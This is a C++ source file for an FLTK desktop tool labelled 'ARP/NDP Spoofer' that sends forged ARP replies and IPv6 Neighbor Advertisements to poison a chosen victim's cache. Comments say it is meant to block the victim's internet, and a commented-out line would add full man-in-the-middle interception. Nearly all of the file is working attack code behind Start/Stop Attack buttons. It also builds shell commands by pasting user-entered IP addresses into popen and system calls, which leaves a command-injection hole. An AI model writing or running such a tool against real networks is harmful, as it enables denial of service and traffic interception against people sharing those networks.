#ifndef _GNU_SOURCE
#define _GNU_SOURCE // Required for some definitions in netinet/icmp6.h on certain Linux systems
#endif

#include <iostream>          // For std::cout, std::cerr, std::endl
#include <string>            // For std::string
#include <vector>            // For dynamic arrays (packet buffer)
#include <cstring>           // For memset, memcpy
#include <unistd.h>          // For close, close()
#include <sys/socket.h>      // For socket, sendto, Core socket functions and types
#include <netinet/in.h>      // For sockaddr_in6, in6_addr, Internet address family (sockaddr_in, in_addr)
#include <arpa/inet.h>       // For inet_pton, inet_ntop, htons, htonl (host to network byte order conversion)
#include <net/if.h>          // For if_nametoindex, Network interface definitions (ifreq, if_nametoindex)
#include <sys/ioctl.h>       // For ioctl
#include <netinet/icmp6.h>   // For icmp6_hdr, nd_neighbor_advert, ND_NEIGHBOR_ADVERT, ND_NA_FLAG_OVERRIDE, ND_NA_FLAG_SOLICITED, ND_OPT_TARGET_LINKADDR, nd_opt_hdr
#include <netinet/ip6.h>     // For ip6_hdr (though kernel handles this with IPPROTO_ICMPV6 raw socket)
#include <fstream>           // For file streams (ifstream)
#include <sstream>           // For string streams (stringstream)
#include <thread>            // For std::this_thread::sleep_for
#include <chrono>            // For std::chrono
#include <net/ethernet.h>    // Ethernet header definitions (ether_header, ETHERTYPE_ARP)
#include <linux/if_packet.h> // Linux specific: AF_PACKET and sockaddr_ll
#include <net/if_arp.h>      // For ARP opcodes (ARPOP_REQUEST, ARPOP_REPLY)

// FLTK GUI Headers
#include <FL/Fl.H>
#include <FL/Fl_Window.H>
#include <FL/Fl_Input.H>
#include <FL/Fl_Button.H>
#include <FL/Fl_Choice.H>
#include <FL/Fl_Output.H>
#include <FL/fl_ask.H>
#include <atomic>




class ARPSpoof {
    public:
        const char* if_name = "wlp4s0";
        const char* source_ip;
        const char* target_ip;


        // ARP Header Structure
        struct arp_header {
            unsigned short htype;       // Hardware Type (e.g., Ethernet)
            unsigned short ptype;       // Protocal Type (e.g., IPv4, IPv6)
            unsigned char hlen;         // Hardware Address Length (e.g., 6 for MAC)
            unsigned char plen;         // Protocal Address Length (e.g., 4 for IPv4)
            unsigned short opcode;      // ARP Operation (request=1, reply=2)
            unsigned char sender_mac[6];// Drnfrt Mac Address
            unsigned int sender_ip;     // Sender IP Address
            unsigned char target_mac[6];// Target MAC Address
            unsigned int target_ip;     // Target IP Address
        };


        // Function to convert MAC address to string format
        std::string mac_to_string(unsigned char* mac) {
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            return std::string(mac_str);
        };


        // Function to get local interface's IP address
        bool get_local_ip(const std::string& ifname, std::string& ip_str) {
            int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                perror("socket");
                return false;
            };
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
                perror("ioctl SIOCIFADDR");
                close(fd);
                return false;
            };
            close(fd);
            ip_str = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
            return true;
        };


        // Function to get local interface's MAC address
        bool get_local_mac(const std::string& ifname, unsigned char* mac_addr) {
            int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                perror("socket");
                return false;
            };
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
                perror("ioctl SIOCGIFHWADDR");
                close(fd);
                return false;
            };
            close(fd);
            memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
            return true;
        };


        // Function to get interface index
        int get_if_index(const std::string& ifname) {
            int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            if (fd < 0) {
                perror("Socket AF_PACKET");
                return -1;
            }
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
                perror("ioctl SIOCGIFINDEX");
                close(fd);
                return -1;
            }
            close(fd);
            return ifr.ifr_ifindex;
        }


        // Function to get MAC address from ARP cache
        std::string get_mac_from_arp_cache(const std::string& target_ip) {
            std::ifstream arp_file("/proc/net/arp");
            if (!arp_file.is_open()) {
                std::cerr << "Error opening /proc/net/arp" << std::endl;
                return "";
            }

            std::string line;
            // Skip header line
            std::getline(arp_file, line);

            while (std::getline(arp_file, line)) {
                std::stringstream ss(line);
                std::string ip_addr_str, hw_type_str, flags_str, mac_addr_str, mask_str, device_str;
                ss >> ip_addr_str >> hw_type_str >> flags_str >> mac_addr_str >> mask_str >> device_str;

                if (ip_addr_str == target_ip) {
                    return mac_addr_str;
                }
            }
            return ""; // IP not found in ARP cache
        }


        // Function to Get MAC Address from IP address
        std::string get_mac_from_ip(const std::string& target_ip_str, const std::string& interface_name) {
            unsigned char local_mac[6];
            std::string local_ip_str;

            if (!get_local_mac(interface_name, local_mac)) {
                std::cerr << "Error: Could not get local MAC address for interface " << interface_name << std::endl;
                return "";
            }
            if (!get_local_ip(interface_name, local_ip_str)) {
                std::cerr << "Error: Could not get local IP address for interface " << interface_name << std::endl;
                return "";
            }

            int if_index = get_if_index(interface_name);
            if (if_index == -1) {
                std::cerr << "Error: Could not get interface index for " << interface_name << std::endl;
                return "";
            }

            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
            if (sockfd < 0) {
                perror("socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)");
                return "";
            }

            // Set a receive timeout
            struct timeval tv;
            tv.tv_sec = 1; // 1 second timeout
            tv.tv_usec = 0;
            if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv)) < 0) {
                perror("setsockopt SO_RCVTIMEO");
                close(sockfd);
                return "";
            }

            // Prepare target IP address
            struct in_addr target_in_addr;
            if (inet_pton(AF_INET, target_ip_str.c_str(), &target_in_addr) != 1) {
                std::cerr << "Error: Invalid target IP address" << std::endl;
                close(sockfd);
                return "";
            }

            struct in_addr local_in_addr;
            if (inet_pton(AF_INET, local_ip_str.c_str(), &local_in_addr) != 1) {
                std::cerr << "Error: Invalid local IP address" << std::endl;
                close(sockfd);
                return "";
            }

            // Construct Ethernet frame and ARP request
            std::vector<unsigned char> ether_frame(ETH_HLEN + sizeof(arp_header));
            struct ether_header* eh = (struct ether_header*)ether_frame.data();
            struct arp_header* ah = (struct arp_header*)(ether_frame.data() + ETH_HLEN);

            // Ethernet header
            memset(eh->ether_dhost, 0xFF, ETH_ALEN); // Broadcast MAC
            memcpy(eh->ether_shost, local_mac, ETH_ALEN);
            eh->ether_type = htons(ETHERTYPE_ARP);

            // ARP header
            ah->htype = htons(ARPHRD_ETHER);         // Hardware type: Ethernet
            ah->ptype = htons(ETH_P_IP);             // Protocol type: IPv4
            ah->hlen = ETH_ALEN;                     // Hardware address length
            ah->plen = 4;                            // Protocol address length (IPv4)
            ah->opcode = htons(ARPOP_REQUEST);       // ARP request

            memcpy(ah->sender_mac, local_mac, ETH_ALEN);
            ah->sender_ip = local_in_addr.s_addr;
            memset(ah->target_mac, 0x00, ETH_ALEN); // Target MAC: all zeros for request
            ah->target_ip = target_in_addr.s_addr;

            // Destination address for sendto
            struct sockaddr_ll sa_ll;
            memset(&sa_ll, 0, sizeof(sa_ll));
            sa_ll.sll_family = AF_PACKET;
            sa_ll.sll_ifindex = if_index;
            sa_ll.sll_halen = ETH_ALEN;
            memcpy(sa_ll.sll_addr, eh->ether_dhost, ETH_ALEN); // Broadcast destination

            // Send ARP request
            if (sendto(sockfd, ether_frame.data(), ether_frame.size(), 0,
                    (struct sockaddr*)&sa_ll, sizeof(sa_ll)) < 0) {
                perror("sendto");
                close(sockfd);
                return "";
            }

            std::cout << "ARP request sent for IP: " << target_ip_str << std::endl;

            // Receive ARP reply
            std::vector<unsigned char> recv_buffer(1500); // Max Ethernet frame size
            ssize_t bytes_received;

            while (true) {
                bytes_received = recvfrom(sockfd, recv_buffer.data(), recv_buffer.size(), 0, NULL, NULL);
                if (bytes_received < 0) {
                    if (errno == EWOULDBLOCK || errno == EAGAIN) {
                        std::cerr << "Timeout: No ARP reply received." << std::endl;
                        close(sockfd);
                        return "";
                    }
                    perror("recvfrom");
                    close(sockfd);
                    return "";
                }

                if (bytes_received < (ssize_t)(ETH_HLEN + sizeof(arp_header))) {
                    continue; // Packet too short
                }

                eh = (struct ether_header*)recv_buffer.data();
                if (ntohs(eh->ether_type) != ETHERTYPE_ARP) {
                    continue; // Not an ARP packet
                }

                ah = (struct arp_header*)(recv_buffer.data() + ETH_HLEN);

                if (ntohs(ah->opcode) == ARPOP_REPLY && ah->sender_ip == target_in_addr.s_addr) {
                    close(sockfd);
                    return mac_to_string(ah->sender_mac);
                }
            }
        };


        // Helper function to convert MAC address string to 6-byte array
        bool string_to_mac(const std::string& mac_str, unsigned char* mac_array) {
            int values[6];
            if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
                    &values[0], &values[1], &values[2],
                    &values[3], &values[4], &values[5]) != 6) {
                return false;
            }
            for (int i = 0; i < 6; ++i) {
                mac_array[i] = static_cast<unsigned char>(values[i]);
            }
            return true;
        };


        // Sends an unsolicited ARP reply to 'target_ip_str' telling it that 'spoofed_ip_str'
        // is located at 'spoofed_mac_str'.
        bool send_arp_spoof_reply(const std::string& interface_name,
                                const std::string& target_ip_str,
                                const std::string& target_mac_str,
                                const std::string& spoofed_ip_str,
                                const std::string& spoofed_mac_str) {

            unsigned char my_actual_mac[6]; // The MAC address of the machine sending the spoof.
            if (!get_local_mac(interface_name, my_actual_mac)) {
                std::cerr << "Error: Could not get local MAC address for interface " << interface_name << std::endl;
                return false;
            }

            int if_index = get_if_index(interface_name);
            if (if_index == -1) {
                std::cerr << "Error: Could not get interface index for " << interface_name << std::endl;
                return false;
            }

            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
            if (sockfd < 0) {
                perror("socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)");
                return false;
            }

            // Convert string IPs to network byte order
            struct in_addr target_in_addr, spoofed_in_addr;
            if (inet_pton(AF_INET, target_ip_str.c_str(), &target_in_addr) != 1) {
                std::cerr << "Error: Invalid target IP address for spoofing." << std::endl;
                close(sockfd);
                return false;
            }
            if (inet_pton(AF_INET, spoofed_ip_str.c_str(), &spoofed_in_addr) != 1) {
                std::cerr << "Error: Invalid spoofed IP address." << std::endl;
                close(sockfd);
                return false;
            }

            // Convert string MACs to unsigned char arrays
            unsigned char target_mac_array[6];
            unsigned char spoofed_mac_array[6];
            if (!string_to_mac(target_mac_str, target_mac_array)) {
                std::cerr << "Error: Invalid target MAC address for spoofing." << std::endl;
                close(sockfd);
                return false;
            }
            if (!string_to_mac(spoofed_mac_str, spoofed_mac_array)) {
                std::cerr << "Error: Invalid spoofed MAC address." << std::endl;
                close(sockfd);
                return false;
            }


            // Construct Ethernet frame and ARP reply
            std::vector<unsigned char> ether_frame(ETH_HLEN + sizeof(arp_header));
            struct ether_header* eh = (struct ether_header*)ether_frame.data();
            struct arp_header* ah = (struct arp_header*)(ether_frame.data() + ETH_HLEN);

            // Ethernet header
            // Destination: The MAC of the actual target we are sending this lie to.
            memcpy(eh->ether_dhost, target_mac_array, ETH_ALEN);
            // Source: Our actual MAC, as we are the one sending the packet.
            memcpy(eh->ether_shost, my_actual_mac, ETH_ALEN);
            eh->ether_type = htons(ETHERTYPE_ARP);

            // ARP header
            ah->htype = htons(ARPHRD_ETHER);         // Hardware type: Ethernet
            ah->ptype = htons(ETH_P_IP);             // Protocol type: IPv4
            ah->hlen = ETH_ALEN;                     // Hardware address length
            ah->plen = 4;                            // Protocol address length (IPv4)
            ah->opcode = htons(ARPOP_REPLY);         // ARP operation: REPLY (This is the key for spoofing)

            // Sender of the ARP message: This is the FALSE information.
            // We claim that 'spoofed_ip_str' is at 'spoofed_mac_str'.
            memcpy(ah->sender_mac, spoofed_mac_array, ETH_ALEN); // This is the MAC we want the target to associate with spoofed_ip_str
            ah->sender_ip = spoofed_in_addr.s_addr;             // This is the IP we are spoofing (e.g., gateway's IP)

            // Target of the ARP message: This is the actual target we want to deceive.
            memcpy(ah->target_mac, target_mac_array, ETH_ALEN); // The MAC of the victim
            ah->target_ip = target_in_addr.s_addr;             // The IP of the victim

            // Destination address for sendto (for raw sockets, it's typically just the interface
            // and the target MAC specified in the ethernet header).
            struct sockaddr_ll sa_ll;
            memset(&sa_ll, 0, sizeof(sa_ll));
            sa_ll.sll_family = AF_PACKET;
            sa_ll.sll_ifindex = if_index;
            sa_ll.sll_halen = ETH_ALEN;
            memcpy(sa_ll.sll_addr, eh->ether_dhost, ETH_ALEN); // Direct to the victim's MAC

            // Send ARP reply
            if (sendto(sockfd, ether_frame.data(), ether_frame.size(), 0,
                    (struct sockaddr*)&sa_ll, sizeof(sa_ll)) < 0) {
                perror("sendto (spoofed ARP reply)");
                close(sockfd);
                return false;
            }

            std::cout << "Sent spoofed ARP reply: "
                    << spoofed_ip_str << " is at " << spoofed_mac_str
                    << " to " << target_ip_str << " (" << target_mac_str << ")" << std::endl;

            close(sockfd);
            return true;
        }

        int run(std::atomic<bool>& attack_running) {
            std::string interface = if_name; // Your wireless interface
            std::string victim_ip = target_ip; // The IP of the target device whose internet you want to block
            std::string gateway_ip = source_ip; // Your router's (gateway's) IP address

            // 1. Get your machine's MAC address
            unsigned char my_mac_array[6];
            if (!get_local_mac(interface, my_mac_array)) {
                std::cerr << "Failed to get local MAC address." << std::endl;
                return 1;
            }
            std::string my_mac = mac_to_string(my_mac_array);
            std::cout << "My MAC address: " << my_mac << std::endl;

            // 2. Ping the victim to force ARP resolution, then get the victim's MAC address from ARP cache
            std::string ping_command = "ping -c 1 -W 1 " + victim_ip + " > /dev/null 2>&1";
            system(ping_command.c_str());
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            std::string victim_mac = get_mac_from_arp_cache(victim_ip);
            if (victim_mac.empty()) {
                std::cerr << "Failed to get victim's MAC address from ARP cache after ping. Exiting." << std::endl;
                return 1;
            }
            std::cout << "Victim (" << victim_ip << ") MAC address: " << victim_mac << std::endl;

            // 3. Ping the gateway to force ARP resolution, then get the gateway's MAC address from ARP cache
            ping_command = "ping -c 1 -W 1 " + gateway_ip + " > /dev/null 2>&1";
            system(ping_command.c_str());
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            std::string gateway_mac = get_mac_from_arp_cache(gateway_ip);
            if (gateway_mac.empty()) {
                std::cerr << "Failed to get gateway's MAC address from ARP cache after ping. Exiting." << std::endl;
                return 1;
            }
            std::cout << "Gateway (" << gateway_ip << ") MAC address: " << gateway_mac << std::endl;

            std::cout << "\nStarting ARP spoofing to block internet for " << victim_ip << std::endl;
            std::cout << "Press Ctrl+C to stop.\n" << std::endl;

            while (attack_running) {
                // Spoof the gateway for the victim:
                // Tell victim_ip that gateway_ip is at my_mac
                if (!send_arp_spoof_reply(interface, victim_ip, victim_mac, gateway_ip, my_mac)) {
                    std::cerr << "Error sending spoofed reply to victim for gateway." << std::endl;
                }

                // Optional: Spoof the victim for the gateway (for full MitM)
                // if (!send_arp_spoof_reply(interface, gateway_ip, gateway_mac, victim_ip, my_mac)) {
                //     std::cerr << "Error sending spoofed reply to gateway for victim." << std::endl;
                // }

                std::this_thread::sleep_for(std::chrono::seconds(2)); // Send every 2 seconds to refresh cache
            }

            return 0;
        }
};


class NDPSpoof {
    public:
        const char* if_name = "wlp4s0";
        const char* source_ip;
        const char* target_ip;


        // Function to convert a MAC address string (e.g., "00:11:22:33:44:55") to a byte array.
        // This uses sscanf for parsing, which is a standard C library function.
        void mac_aton(const std::string& mac_str, unsigned char* mac_addr) {
            sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &mac_addr[0], &mac_addr[1], &mac_addr[2],
                &mac_addr[3], &mac_addr[4], &mac_addr[5]);
        }


        // The network interface through which the packet will be sent.
        // Function to get the MAC address for a given IPv6 address using the neighbor cache (ip -6 neigh)
        std::string get_mac_from_ipv6(const std::string& ipv6_addr) {
            std::string cmd = "ip -6 neigh show " + ipv6_addr + " | awk '{print $5}'";
            FILE* fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char buf[64] = {0};
            if (fgets(buf, sizeof(buf), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            // Remove trailing newline
            std::string mac(buf);
            mac.erase(mac.find_last_not_of(" \n\r\t")+1);
            return mac;
        }
        // Function to get the MAC address of the local interface for a given IPv6 address
        std::string get_self_mac_from_ipv6(const std::string& ipv6_addr) {
            // Find the interface name for the given IPv6 address
            std::string cmd = "ip -6 addr show | grep '" + ipv6_addr + "' -B2 | grep '^[0-9]' | awk '{print $2}' | sed 's/://'";
            FILE* fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char ifname[64] = {0};
            if (fgets(ifname, sizeof(ifname), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            std::string iface(ifname);
            iface.erase(iface.find_last_not_of(" \n\r\t")+1);

            // Now get the MAC address for that interface
            cmd = "cat /sys/class/net/" + iface + "/address";
            fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char mac[64] = {0};
            if (fgets(mac, sizeof(mac), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            std::string mac_str(mac);
            mac_str.erase(mac_str.find_last_not_of(" \n\r\t")+1);
            return mac_str;
        }
        int run(std::atomic<bool>& attack_running) {
            // The IPv6 address of the legitimate device that is being spoofed.
            // This will appear as the source of the Neighbor Advertisement.
            const char* source_ipv6_str = source_ip;
            // The MAC address of the legitimate device being spoofed.
            std::string source_mac_str = get_self_mac_from_ipv6(source_ipv6_str);

            // The IPv6 address whose link-layer address (MAC) is being advertised.
            // This is the IP you want to associate with the 'spoofed_mac_str'.
            const char* target_ipv6_str = target_ip;

            // The MAC address that will be advertised for the 'target_ipv6_str'.
            // This is the MAC address you want the network to believe the target IP has.
            std::string spoofed_mac_str = get_mac_from_ipv6(target_ipv6_str);

            // The destination IPv6 address for the Neighbor Advertisement.
            // 'ff02::1' is the IPv6 multicast address for all nodes on the local link.
            const char* destination_ipv6_str = "ff02::1";

            // --- Variables for network structures ---
            int sock_fd;                     // Socket file descriptor
            struct sockaddr_in6 dest_addr;   // Structure to hold the destination IPv6 address for sendto
            struct in6_addr source_in6_addr, target_in6_addr, dest_in6_addr; // Structures for IPv6 addresses
            unsigned char source_mac[6];     // Byte array for the source MAC address
            unsigned char spoofed_mac[6];    // Byte array for the spoofed MAC address

            // --- Packet buffer ---
            // A buffer to construct the raw ICMPv6 Neighbor Advertisement packet.
            // The size is calculated to comfortably hold the IPv6 header (if created by application),
            // ICMPv6 header, Neighbor Advertisement header, and the Target Link-Layer Address option.
            const int PACKET_SIZE = 100; // Sufficient for this type of packet
            unsigned char packet_buffer[PACKET_SIZE];
            memset(packet_buffer, 0, PACKET_SIZE); // Initialize all bytes to zero

            // --- Convert address strings to binary network format ---
            // inet_pton converts an IPv6 address from text to binary form.
            if (inet_pton(AF_INET6, source_ipv6_str, &source_in6_addr) != 1) {
                std::cerr << "Error: Invalid source IPv6 address." << std::endl;
                return 1;
            }
            if (inet_pton(AF_INET6, target_ipv6_str, &target_in6_addr) != 1) {
                std::cerr << "Error: Invalid target IPv6 address." << std::endl;
                return 1;
            }
            if (inet_pton(AF_INET6, destination_ipv6_str, &dest_in6_addr) != 1) {
                std::cerr << "Error: Invalid destination IPv6 address." << std::endl;
                return 1;
            }
            // Convert MAC address strings to byte arrays.
            mac_aton(source_mac_str, source_mac);
            mac_aton(spoofed_mac_str, spoofed_mac);

            // --- Create Raw Socket ---
            // AF_INET6: Specifies IPv6 addressing.
            // SOCK_RAW: Allows sending and receiving raw network packets.
            // IPPROTO_ICMPV6: Specifies that the socket will handle ICMPv6 packets.
            // The kernel will automatically construct the IPv6 header based on the destination and source
            // (if the source is implicitly determined by the interface).
            sock_fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
            if (sock_fd < 0) {
                perror("socket creation failed");
                std::cerr << "Error: Could not create raw socket. Are you running as root (sudo)?" << std::endl;
                return 1;
            }

            // --- Bind socket to interface (optional but highly recommended for raw sockets) ---
            // This ensures that packets are sent out through the specified network interface.
            // if_nametoindex: Converts an interface name (e.g., "eth0") to its corresponding index.
            unsigned int if_idx = if_nametoindex(if_name);
            if (if_idx == 0) {
                std::cerr << "Error: Interface '" << if_name << "' not found." << std::endl;
                close(sock_fd);
                return 1;
            }
            // SO_BINDTODEVICE: Socket option to bind the socket to a specific device.
            // This is a Linux-specific socket option.
            if (setsockopt(sock_fd, SOL_SOCKET, SO_BINDTODEVICE, if_name, strlen(if_name)) < 0) {
                perror("setsockopt SO_BINDTODEVICE failed");
                std::cerr << "Warning: Could not bind socket to interface " << if_name
                        << ". Packet might be sent via default route." << std::endl;
                // This is a warning, not a fatal error, as packet might still be sent.
            }


            // --- Construct Neighbor Advertisement (NA) Packet ---

            // 1. ICMPv6 Header (common to all ICMPv6 messages)
            struct icmp6_hdr *icmp6 = (struct icmp6_hdr *)packet_buffer;
            icmp6->icmp6_type = ND_NEIGHBOR_ADVERT; // Type 136 for Neighbor Advertisement
            icmp6->icmp6_code = 0;                  // Code 0 for Neighbor Advertisement
            icmp6->icmp6_cksum = 0;                 // Checksum is often calculated by kernel for ICMPv6 raw sockets,
                                                    // or can be calculated manually if needed (more complex).
                                                    // Setting to 0 here relies on kernel or a later calculation.

            // 2. Neighbor Advertisement Header (specific fields for NA)
            // Changed 'nd_na_hdr' to 'nd_neighbor_advert' for compatibility with standard Linux headers.
            struct nd_neighbor_advert *nd_na = (struct nd_neighbor_advert *)(packet_buffer + sizeof(struct icmp6_hdr));
            // Flags:
            // R (Router) flag: 0 (Host) or 1 (Router). Set to 0 for a non-router spoof.
            // S (Solicited) flag: 1 if in response to NS, 0 for unsolicited.
            // O (Override) flag: 1 to override existing cache entries, 0 otherwise.
            // For a typical spoof, you might use ND_NA_FLAG_OVERRIDE (to force update)
            // and sometimes 0 for unsolicited. For demonstration, we use both.
            nd_na->nd_na_flags_reserved = ND_NA_FLAG_OVERRIDE | ND_NA_FLAG_SOLICITED; // Example: Override and Solicited

            // Target Address: The IPv6 address whose link-layer address is being advertised by this NA.
            memcpy(&nd_na->nd_na_target, &target_in6_addr, sizeof(struct in6_addr));

            // 3. Target Link-Layer Address Option
            // This option carries the MAC address that corresponds to the target IPv6 address.
            struct nd_opt_hdr *nd_opt = (struct nd_opt_hdr *)(packet_buffer + sizeof(struct icmp6_hdr) + sizeof(struct nd_neighbor_advert));
            nd_opt->nd_opt_type = ND_OPT_TARGET_LINKADDR; // Type 2 for Target Link-Layer Address
            nd_opt->nd_opt_len = 1;                       // Length of option in 8-byte units (1 * 8 bytes = type + length + 6 bytes MAC)

            // Copy the spoofed MAC address into the option's data field.
            // The MAC address immediately follows the 8-byte option header (nd_opt).
            memcpy(nd_opt + 1, spoofed_mac, 6); // +1 moves pointer past nd_opt_hdr to the data area

            // --- Calculate total packet length ---
            // The sum of the sizes of the ICMPv6 header, Neighbor Advertisement header,
            // Target Link-Layer Address Option header, and the 6-byte MAC address data.
            int packet_len = sizeof(struct icmp6_hdr) + sizeof(struct nd_neighbor_advert) + sizeof(struct nd_opt_hdr) + 6;

            // --- Prepare destination address structure for sendto ---
            memset(&dest_addr, 0, sizeof(dest_addr));
            dest_addr.sin6_family = AF_INET6; // Specify IPv6 family
            // Copy the destination IPv6 address (multicast all-nodes) into the structure.
            memcpy(&dest_addr.sin6_addr, &dest_in6_addr, sizeof(struct in6_addr));
            // Port is not applicable for raw IPPROTO_ICMPV6 sockets.

            std::cout << "Sending spoofed Neighbor Advertisement for " << target_ipv6_str
                    << " with MAC " << spoofed_mac_str << " from interface " << if_name << std::endl;

            // --- Send the packet ---
            // sock_fd: The socket file descriptor.
            // packet_buffer: The buffer containing the constructed ICMPv6 packet.
            // packet_len: The total size of the ICMPv6 packet.
            // 0: No special flags.
            // (struct sockaddr *)&dest_addr: Pointer to the destination address structure.
            // sizeof(dest_addr): Size of the destination address structure.
            while (attack_running) {
                ssize_t bytes_sent = sendto(sock_fd, packet_buffer, packet_len, 0,
                                        (struct sockaddr *)&dest_addr, sizeof(dest_addr));


                if (bytes_sent < 0) {
                    perror("sendto failed"); // Prints system error message
                    std::cerr << "Error: Failed to send packet. Check permissions and network setup." << std::endl;
                } else {
                    std::cout << "Successfully sent " << bytes_sent << " bytes." << std::endl;
                }
            };

            // --- Close socket ---
            close(sock_fd);

            return 0; // Indicate successful execution
        };
};


class SpooferGUI : public Fl_Window {
public:
    SpooferGUI(int w, int h, const char* title)
        : Fl_Window(w, h, title),
        attack_running(false),
        attack_thread(nullptr) {
        
        // --- GUI Widget Initialization ---
        
        // Input for Network Interface
        inp_interface = new Fl_Input(120, 20, 260, 25, "Interface:");
        inp_interface->value("wlp4s0"); // Default value

        // Input for Gateway (Source) IP
        inp_gateway_ip = new Fl_Input(120, 55, 260, 25, "Source IP:");

        // Input for Target (Victim) IP
        inp_target_ip = new Fl_Input(120, 90, 260, 25, "Target IP:");

        // Dropdown for Attack Type
        choice_attack_type = new Fl_Choice(120, 125, 150, 25, "Attack Type:");
        choice_attack_type->add("ARP (IPv4)");
        choice_attack_type->add("NDP (IPv6)");
        choice_attack_type->value(0); // Default to ARP

        // Start Attack Button
        btn_start = new Fl_Button(20, 170, 170, 30, "Start Attack");
        btn_start->callback(start_attack_cb, this);

        // Stop Attack Button
        btn_stop = new Fl_Button(210, 170, 170, 30, "Stop Attack");
        btn_stop->callback(stop_attack_cb, this);
        btn_stop->deactivate(); // Initially disabled

        // Status Output
        out_status = new Fl_Output(20, 220, 360, 25, "Status:");
        out_status->value("Idle.");

        this->end();
        this->resizable(this);
    }

    ~SpooferGUI() override {
        stop_attack(); // Ensure thread is stopped on exit
    }

private:
    // --- FLTK Widgets ---
    Fl_Input* inp_interface;
    Fl_Input* inp_gateway_ip;
    Fl_Input* inp_target_ip;
    Fl_Choice* choice_attack_type;
    Fl_Button* btn_start;
    Fl_Button* btn_stop;
    Fl_Output* out_status;
    
    // --- Threading and State ---
    std::atomic<bool> attack_running;
    std::unique_ptr<std::thread> attack_thread;

    // --- Attack Logic ---
    void start_attack() {
        if (attack_running) {
            fl_alert("Attack is already running!");
            return;
        }

        // Get values from GUI
        std::string interface = inp_interface->value();
        std::string source = inp_gateway_ip->value();
        std::string target = inp_target_ip->value();
        int attack_type = choice_attack_type->value();

        if (interface.empty() || source.empty() || target.empty()) {
            fl_alert("Please fill in all fields: Interface, Source IP, and Target IP.");
            return;
        }
        
        attack_running = true;
        
        // Launch attack in a separate thread
        attack_thread = std::make_unique<std::thread>([this, interface, source, target, attack_type]() {
            try {
                // ARP Spoofing
                if (attack_type == 0) {
                    ARPSpoof spoof;
                    spoof.target_ip = target.c_str();
                    spoof.source_ip = source.c_str();
                    spoof.if_name = interface.c_str();
                    spoof.run(attack_running);
                }
                // NDP Spoofing
                else {
                    NDPSpoof spoof;
                    spoof.target_ip = target.c_str();
                    spoof.source_ip = source.c_str();
                    spoof.if_name = interface.c_str();
                    spoof.run(attack_running);
                }
            } catch (const std::exception& e) {
                // Since this runs in a different thread, we can't show an fl_alert directly.
                // We'd need a more complex mechanism to pass the error to the main GUI thread.
                std::cerr << "Exception in attack thread: " << e.what() << std::endl;
                // For simplicity, we just print to console.
            }
        });
        
        // Update GUI state
        btn_start->deactivate();
        btn_stop->activate();
        out_status->value("Attack running...");
    }

    void stop_attack() {
        if (attack_running) {
            attack_running = false;
            if (attack_thread && attack_thread->joinable()) {
                attack_thread->join();
            }
        }
        
        // Update GUI state
        btn_start->activate();
        btn_stop->deactivate();
        out_status->value("Idle. Attack stopped.");
    }
    
    // --- Static Callbacks for FLTK ---
    static void start_attack_cb(Fl_Widget* w, void* data) {
        static_cast<SpooferGUI*>(data)->start_attack();
    }

    static void stop_attack_cb(Fl_Widget* w, void* data) {
        static_cast<SpooferGUI*>(data)->stop_attack();
    }
};


int main(int argc, char* argv[]) {

    // Elevate privileges check (for Linux)
    if (getuid() != 0) {
        fl_alert("This program requires root privileges to create raw sockets. Please run with sudo.");
        return 1;
    }

    // Start GUI
    SpooferGUI* window = new SpooferGUI(400, 260, "ARP/NDP Spoofer");
    window->show(argc, argv);
    return Fl::run();

    const char* ip_ver = argv[1];
    const char* source_ip_str = argv[2];
    const char* target_ip_str = argv[3];
    const char* interface = (argc >= 5) ? argv[4] : "wlp4s0";
}